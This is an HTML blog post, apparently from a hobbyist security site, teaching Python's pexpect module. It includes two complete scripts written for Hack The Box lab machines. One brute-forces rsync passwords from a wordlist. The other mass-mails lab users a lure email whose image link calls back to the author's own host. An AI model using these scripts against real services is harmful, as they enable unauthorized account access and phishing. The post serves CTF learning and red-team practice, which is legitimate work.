@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <title> PExpect, the Forgotten Module &middot; Agr0 Hacks Stuff </title>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.80.0" />
+
+
+
+
+<script src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://agrohacksstuff.io/css/nix.css">
+
+
+
+
+
+<link href="https://fonts.googleapis.com/css?family=Inconsolata%7COpen+Sans%7CConcert+One" rel="stylesheet">
+
+
+
+
+
+
+    </head>
+
+    <body>
+        <header>
+<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+      <a class="navbar-brand" id="green-terminal" href='https://agrohacksstuff.io/'>
+        agr0@agrohacksstuff.io ~ $
+      </a>
+		</div>
+
+		
+		<div class="collapse navbar-collapse" id="navbar-collapse-1">
+			<ul class="nav navbar-nav navbar-right">
+				<li>
+					<a href='https://agrohacksstuff.io/'>/home/agr0</a>
+        </li>
+        
+				
+				
+				<li class="dropdown">
+                    
+            		<a href="https://agrohacksstuff.io/crypto">~/crypto</a>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+            		<a href="https://agrohacksstuff.io/cheatsheets">~/cheat sheets</a>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+            		<a href="https://agrohacksstuff.io/about">~/about</a>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+            		<a href="https://agrohacksstuff.io/python">~/python</a>
+            		
+        		</li>
+        		
+
+			</ul>
+		</div>
+	</div>
+</nav>
+</header>
+
+        <div class="flex-wrapper">
+            <div class="container wrapper">
+                <h1><a href="https://agrohacksstuff.io/python/pexpect/">PExpect, the Forgotten Module</a></h1>
+                <span class="post-date">2021-02-20 </span>
+                <div class="post-content">
+                    <p>The title may be a bit exaggerated, but to be perfectly honest I feel that PExpect, the Python version of standard old <a href="https://en.wikipedia.org/wiki/Expect">Expect</a>, is hardly ever mentioned in the many Infosec personalities I follow when they create an exploit or some sort of python script that interacts with a service or protocol. And that is a total shame, because pexpect is crazy powerful and probably one of the most useful modules I&rsquo;ve ever come across. I do see some form of it used in specific exploits however, most notably within the <a href="https://docs.pwntools.com/en/stable/">Pwntools</a> library. In fact, the syntax is pretty similar, albeit a bit more rudimentary. But PExpect has one big advantage that pwntools doesn&rsquo;t: you probably have it installed already in your default python environment. At least I do, and I&rsquo;m running Ubuntu Desktop.</p>
+<p>PExpect allows you to start up a process with arguments, read from it until a specific line is encountered <em>or expected</em>, and send additional arbitrary commands to the process based on its returned value. It&rsquo;s pretty neat! In a pragmatic sense, it can be useful for network engineering where you might have scripts that need to log into a console somewhere and interact with some sort of network device like a router or switch. But from my point of view, the red teamer, it can be used to interact with a non-standard service to issue an exploit or brute forcing mechanism. You can read <a href="https://pexpect.readthedocs.io/en/stable/">all the documetation for it</a>, so instead of duplicating effort I&rsquo;ll just show you the basics of what I use it for.</p>
+<h2 id="basics">Basics</h2>
+<p>First, to spawn a process, use this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">p <span style="color:#f92672">=</span> pexpect<span style="color:#f92672">.</span>spawn(<span style="color:#e6db74">&#34;nc 10.20.30.40 25&#34;</span>)
+</code></pre></div><p>This starts the netcat binary which connects to a remote SMTP server. You can then send arbitrary data to it.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;HELO abc.com&#34;</span>)
+</code></pre></div><p>The &ldquo;sendline()&rdquo; function will take a string and send it with a newline separator appended to the end. If you don&rsquo;t want to send a newline or send it yourself, use send().</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;Some data without a newline&#34;</span>)
+</code></pre></div><p>You can then have the program wait until an expected line is sent to the receive buffer:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">p<span style="color:#f92672">.</span>expect(<span style="color:#e6db74">&#34;250 debian&#34;</span>)
+</code></pre></div><p>The program will block until that exact string is sent to the receive buffer. You can specify multiple possibilities by sending them as a list:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">result <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>expect([<span style="color:#e6db74">&#34;250 debian&#34;</span>, <span style="color:#e6db74">&#34;Error&#34;</span>])
+</code></pre></div><p>In this way, the variable &ldquo;result&rdquo; will contain the index of which expect possibility that it hit. For example, if the &ldquo;Error&rdquo; string is hit, the &ldquo;result&rdquo; variable will contain the value of 1. If &ldquo;250 debian&rdquo; is hit, result will be 0. You can tie this into an if statement:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">if</span> result <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Program hit an error!&#34;</span>)
+<span style="color:#66d9ef">else</span>:
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;We got what we expected!&#34;</span>)
+</code></pre></div><p>You can also specify an EOF or a Timeout, similarly &ndash; if the spawned process hits a timeout or the connection is severed:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">result <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>expect([<span style="color:#e6db74">&#34;250 debian&#34;</span>, <span style="color:#e6db74">&#34;Error&#34;</span>, pexpect<span style="color:#f92672">.</span>EOF, pexpect<span style="color:#f92672">.</span>TIMEOUT])
+</code></pre></div><h2 id="okay-so-what">Okay. So what?</h2>
+<p>PExpect has so many possibilities. I&rsquo;ve found a lot of success in attempting to write brute-forcer scripts for non-standard protocols. Only after searching did I discover an <code>rsync</code> brute forcer script written for nmap (Credit to <a href="https://book.hacktricks.xyz/brute-force">Hacktricks</a> for that neat one), but when I wrote this for the <code>Zetta</code> challenge on Hack The Box, I couldn&rsquo;t find anything to use for it. That said, this is the brute force script I wrote for rsync that connected to a machine via IPv6!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+
+<span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">    This script will attempt to brute force an rsync server
+</span><span style="color:#e6db74">    listening on ipv6. This ordinarily wouldn&#39;t work but since
+</span><span style="color:#e6db74">    there isn&#39;t any weird timeout issue I&#39;m going to go ahead
+</span><span style="color:#e6db74">    and just brute force the command itself.
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+
+<span style="color:#f92672">import</span> pexpect
+<span style="color:#f92672">import</span> sys
+
+cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;rsync -avs rsync://roy@[dead:beef::250:56ff:feb9:7cc4]:8730/home_roy .&#34;</span>
+prompt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Password: &#34;</span>
+error <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;auth failed&#34;</span>
+pass_list <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./passwords.txt&#34;</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">try_pass</span>(password):
+    <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">    This will actually attempt to log in with the password.
+</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+    attempt <span style="color:#f92672">=</span> pexpect<span style="color:#f92672">.</span>spawn(cmd)
+    login <span style="color:#f92672">=</span> attempt<span style="color:#f92672">.</span>expect([prompt, pexpect<span style="color:#f92672">.</span>EOF, pexpect<span style="color:#f92672">.</span>TIMEOUT])
+    <span style="color:#66d9ef">if</span> login <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+        attempt<span style="color:#f92672">.</span>sendline(password)
+        result <span style="color:#f92672">=</span> attempt<span style="color:#f92672">.</span>expect([error, pexpect<span style="color:#f92672">.</span>EOF, pexpect<span style="color:#f92672">.</span>TIMEOUT])
+
+        <span style="color:#66d9ef">if</span> result <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+            <span style="color:#66d9ef">return</span> False
+        <span style="color:#66d9ef">elif</span> result <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+            <span style="color:#66d9ef">return</span> True
+        <span style="color:#66d9ef">elif</span> result <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>:
+            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;Timeout&#34;</span>)
+        <span style="color:#66d9ef">else</span>:
+            <span style="color:#66d9ef">return</span> True
+    <span style="color:#66d9ef">else</span>:
+        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;EOF or Timeout, machine unreachable?&#34;</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+    <span style="color:#66d9ef">with</span> open(pass_list, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+        passwords <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>splitlines()
+
+    <span style="color:#66d9ef">for</span> passw <span style="color:#f92672">in</span> passwords:
+        <span style="color:#75715e"># need this for rockyou encoding</span>
+        this_pass <span style="color:#f92672">=</span> passw<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
+        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(f<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">Trying:&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; &#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span>)
+        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(f<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">Trying: {this_pass}&#34;</span>)
+        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
+        <span style="color:#66d9ef">if</span> try_pass(this_pass):
+            sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34; &#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">60</span>)
+            sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(f<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">Found! {this_pass}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+            <span style="color:#66d9ef">break</span>
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    main()
+
+</code></pre></div><p>As you can see, it tries to log in with the one user <code>roy</code> and uses every single password in my password list. I believe here I just used <code>rockyou.txt</code> but perhaps a more conservative approach would be to collect words from the server with CeWL&hellip;but I digress.</p>
+<p>Similarly, I also used PExpect to write a mail bomb script for the SneakyMailer challenge box on Hack The Box as well. Ippsec used <a href="http://www.jetmore.org/john/code/swaks/">SWAKS</a> to do the same thing, and that was probably the better option, but I couldn&rsquo;t resist writing my own mailbomber. I explained <a href="/cheatsheets/advbash">how to do this in Bash</a>, but admittedly this is probably the better way since it doesn&rsquo;t just dump a ton of commands onto the service without waiting for a response. This way it actually waits until it receives a specific line before sending a new directive:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+
+<span style="color:#f92672">import</span> pexpect
+
+cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;nc 10.10.10.197 25&#34;</span>
+
+<span style="color:#75715e"># Here is a bunch of statements we can expect from the remote mail server</span>
+rec_initialize <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;250 debian&#34;</span>
+rec_mailfrom <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;250 2.1.0 Ok&#34;</span>
+rec_mailto <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;250 2.1.5 Ok&#34;</span>
+rec_mailto_bounce <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Recipient address rejected&#34;</span>
+rec_rset <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;250 2.0.0 Ok&#34;</span>
+rec_data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;&#34;</span>
+rec_mailok <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;250 2.0.0 Ok: queued&#34;</span>
+
+<span style="color:#75715e"># My list of potential users</span>
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;./myusers.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
+    userslist <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>splitlines()
+
+<span style="color:#75715e"># The email contents, don&#39;t judge me</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;OPEN THIS IMAGE, PLS
+</span><span style="color:#e6db74">&lt;img src=&#34;http://10.10.14.15/hifriend.gif&#34;&gt;
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">That&#39;s it, thanks.&#34;&#34;&#34;</span>
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">email_spam</span>(userlist, p):
+    <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">        Will take p as the spawned pexpect object and simply
+</span><span style="color:#e6db74">        loop through the user list and send the email looking
+</span><span style="color:#e6db74">        for potential users.
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">        It is assumed we are ready to send email at this point
+</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> user <span style="color:#f92672">in</span> userlist:
+        p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;MAIL FROM: agr0@hi.com&#34;</span>)
+        p<span style="color:#f92672">.</span>expect(rec_mailfrom)
+        p<span style="color:#f92672">.</span>sendline(f<span style="color:#e6db74">&#34;RCPT TO: {user}@sneakymailer.htb&#34;</span>)
+        mailto_res <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>expect([rec_mailto, rec_mailto_bounce])
+        <span style="color:#66d9ef">if</span> mailto_res <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+            <span style="color:#66d9ef">print</span>(f<span style="color:#e6db74">&#34;Unknown user: {user}! Skipping...&#34;</span>)
+            p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;RSET&#34;</span>)
+            p<span style="color:#f92672">.</span>expect(rec_rset)
+            <span style="color:#66d9ef">continue</span>
+
+        <span style="color:#66d9ef">print</span>(f<span style="color:#e6db74">&#34;Sending mail to {user}@sneakymailer.htb...&#34;</span>)
+        p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;DATA&#34;</span>)
+        p<span style="color:#f92672">.</span>expect(rec_data)
+        p<span style="color:#f92672">.</span>sendline(payload)
+        p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;.&#34;</span>)
+        p<span style="color:#f92672">.</span>expect(rec_mailok)
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Mail sent!&#34;</span>)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+    <span style="color:#75715e"># Setting it up</span>
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Starting up mailsprayer...&#34;</span>)
+
+    <span style="color:#75715e"># Don&#39;t bug me with your verbose output</span>
+    p <span style="color:#f92672">=</span> pexpect<span style="color:#f92672">.</span>spawn(cmd, echo<span style="color:#f92672">=</span>False)
+    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;HELO blah.com&#34;</span>)
+    p<span style="color:#f92672">.</span>expect(rec_initialize)
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Opening up the firehose!&#34;</span>)
+    email_spam(userslist, p)
+
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    main()
+
+</code></pre></div><p>I can&rsquo;t <em>not</em> add my own flair to my code. Sorry not sorry. But you see that I&rsquo;m spawning a netcat process to connect to the remote mail server on port 25 and executing the directives line by line to send mail. I even found out how to use the <code>RSET</code> directive to start a new mail without severing the TCP connection! See, hacking is all about learning new tricks.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>Pwntools has a very similar process interaction mechanism that I&rsquo;ve seen a lot of people use instead for similar functionality. While that&rsquo;s totally fine and certainly gets the job done, I feel that using pwntools to accomplish what pexpect can do out of the box is the programming equivalent of hammering a nail to a wall with a sledgehammer.</p>
+<p>But I&rsquo;ll get off my soapbox now.</p>
+
+                </div>
+                
+                <div class="post-comments">
+                    
+                </div>
+                
+            </div>
+            <footer class="footer text-center">
+<p>Copyright &copy; 2021 Agr0 -
+<span class="credit">
+	Powered by
+	<a target="_blank" href="https://gohugo.io">Hugo</a>
+	and
+	<a target="_blank" href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme.
+</span>
+</p>
+</footer>
+
+        </div>
+    </body>
